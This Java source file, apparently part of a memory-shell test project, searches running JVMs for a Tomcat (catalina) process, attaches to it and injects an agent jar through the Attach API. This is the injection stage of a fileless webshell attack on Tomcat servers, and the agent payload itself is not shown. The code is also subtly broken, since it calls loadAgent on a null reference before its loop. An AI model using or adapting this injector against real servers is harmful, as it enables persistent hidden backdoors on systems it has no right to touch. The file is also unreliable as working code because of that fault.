package priv.memshelltest;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class Attach {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;

        String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = currentPath + "agent-1.0-SNAPSHOT.jar";
        vm.loadAgent(agentFile);
        System.out.println("inject success");

        while (true){
            try{
                vmList =VirtualMachine.list();
                if (vmList.size()<=0){
                    continue;
                }
                for(VirtualMachineDescriptor vmd:vmList){
                    if (vmd.displayName().indexOf("catalina")>0 ||vmd.displayName().equals("")){
                        vm = VirtualMachine.attach(vmd);
                        //ADD for tomcat windows service,dispayname is blank string and has key "catalina.home".
                        if (vmd.displayName().equals("")&&vm.getSystemProperties().containsKey("catalina.home")==false)
                            continue;
                        System.out.println("find  a vm about catalina");
                        Thread.sleep(1000);
                        if(vm !=null){
                            vm.loadAgent(agentFile);
                            System.out.println(" Injected the agentfile");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            }catch (Exception e){
                System.out.println("尝试中");
            }
        }
    }
}
